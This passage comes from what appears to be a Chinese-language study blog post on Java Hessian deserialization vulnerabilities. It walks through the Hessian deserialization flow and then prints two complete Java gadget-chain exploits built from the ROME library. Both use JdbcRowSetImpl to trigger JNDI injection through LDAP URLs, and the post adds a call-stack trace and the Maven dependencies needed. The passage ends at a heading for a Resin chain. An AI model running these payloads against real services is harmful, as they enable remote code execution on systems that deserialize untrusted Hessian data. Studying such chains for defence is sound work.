</span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        person.setAge(<span class="number">18</span>);  </span><br><span class="line">        person.setName(<span class="string">&quot;Feng&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s = serialize(person);  </span><br><span class="line">        System.out.println((Person) deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163231453.png" class="">
<p>再来和Java原生序列化对比一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser_Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);  </span><br><span class="line">        oos.writeObject(t);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span>  <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bai);  </span><br><span class="line">        <span class="keyword">return</span> (T) ois.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        person.setAge(<span class="number">18</span>);  </span><br><span class="line">        person.setName(<span class="string">&quot;Feng&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s=serialize(person);  </span><br><span class="line">        System.out.println((Person) deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163340658.png" class="">
<p>这里对比就可以出来Hessian的序列化的数据长度比Java原生的序列化要短。</p>
<h2 id="Hessian反序列化漏洞分析">Hessian反序列化漏洞分析</h2>
<p>这里我们调试一下Hessian反序列化的流程看一下</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163753010.png" class="">
<p>这里要先跟进这个read()方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231163815867.png" class="">
<p>这里会返回77这个Ascii码为什么呢？这里其实是因为在Hessian序列化对象的时候总是会将结果处理成一个Map所以序列化结果的第一个byte总是M而它的Ascii码就是77</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164125221.png" class="">
<p>这里向下走就会进入到M这个case里我们跟进readType方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164344199.png" class="">
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164401216.png" class="">
<p>这里就是获取我们序列化进去的Person对象的类型，继续回到原来的位置跟进readMap方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231164449298.png" class="">
<p>这里会先根据类型获取一个反序列化器，如果获取不到就使用_hashMapDeserializer来进行readMap，如果他也为null就新建一个HashMap类的反序列化器调用readMap方法。这里我们能够获取到Person的反序列化器跟进去看看</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231165052187.png" class="">
<p>先实例化instantiate对象然后返回readMap跟进去看看</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231165519755.png" class="">
<p>这里会循环获取Person对象中属性的值，然后resolve解析成Person对象。这就是一个正常对象的反序列化流程。</p>
<p>下面来看看恶意的链是怎么触发的我们手动给他赋值让其走到最后一个逻辑看看会调用哪个readMap里</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170108193.png" class="">
<p>跟进看看</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170353815.png" class="">
<p>补充一下就是这里的readObject会去继续反序列化读出来前面传入的值当作key所以后面调用链中使用hashMap 传入的key能够被触发。<br>
关键点在下面的put方法中他会反序列化获取一个对象放入key的位置，在跟进put方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170503061.png" class="">
<p>可以看到这里会调用hash方法跟进去</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20241231170540480.png" class="">
<p>这里调用里hashcode方法，在前面分析过的Rmoe链子就可以在这里使用具体调用链参考<a href="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Rome反序列化</a>这里我直接给出Payload利用的是Jndi注入的链子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_Jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">// ldap url  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/hdtx58&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 创建JdbcRowSetImpl对象  </span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">        jdbcRowSet.setDataSourceName(url);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 创建toStringBean对象  </span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 创建ObjectBean  </span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 创建HashMap  </span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span>  makeMap(objectBean, <span class="string">&quot;aaaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 序列化  </span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);  </span><br><span class="line">        hessian2Output.writeObject(hashMap);  </span><br><span class="line">        hessian2Output.close();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 反序列化  </span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还是依然是在Windows的环境下复现成功Mac下没成功不知道为啥☹️。</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250101165327865.png" class="">
<p>这里来贴一下调用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">577</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2093</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">main:<span class="number">42</span>, Hessian_Rome_Jndi (org.example)</span><br></pre></td></tr></table></figure>
<p>补充一个其他师傅的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_Jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);  </span><br><span class="line">        output.writeObject(o);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> (T) o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://10.37.129.2:1389/oblxsg&quot;</span>;  </span><br><span class="line">        jdbcRowSet.setDataSourceName(url);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);  </span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()  </span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);  </span><br><span class="line">        System.out.println(s);  </span><br><span class="line">        System.out.println((HashMap)deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要添加依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）">Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</h2>
<p>参考：<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a><br>
搭建环境有点复杂。</p>
<p>这里继续写完这篇反序列化的学习，因为期末考试加上每天要打游戏所以实在是没时间写了，今天抽空写一下免得自己以后又忘记了。</p>
<h2 id="Resin链">Resin链</h2>
<p>依赖</p>
